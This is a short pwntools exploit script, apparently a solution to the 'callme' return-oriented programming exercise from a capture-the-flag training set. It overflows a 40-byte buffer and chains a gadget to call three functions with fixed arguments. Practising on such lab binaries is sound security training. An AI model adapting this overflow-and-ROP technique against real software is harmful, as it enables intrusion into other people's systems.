#!/usr/bin/python3
from pwn import *
gs = '''
break pwnme
continue
'''
elf = context.binary = ELF('./callme')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./callme', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./callme')
r = start()
#========= exploit here ===================

offset = 40
pop_rdi = 0x000000000040093c
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
callme_one = 0x0000000000400720
callme_two = 0x0000000000400740
callme_three =0x00000000004006f0
def callme(callme):
   a = [
           p64(pop_rdi),
           p64(arg1),
           p64(arg2),
           p64(arg3),
           p64(callme)
           ]
   return b"".join(a)

payload = [
        b"A"*offset,
        callme(callme_one),
        callme(callme_two),
        callme(callme_three)
        ] 
payload = b"".join(payload)
r.recvuntil(b">")
r.sendline(payload)
#========= interactive ====================

r.interactive()
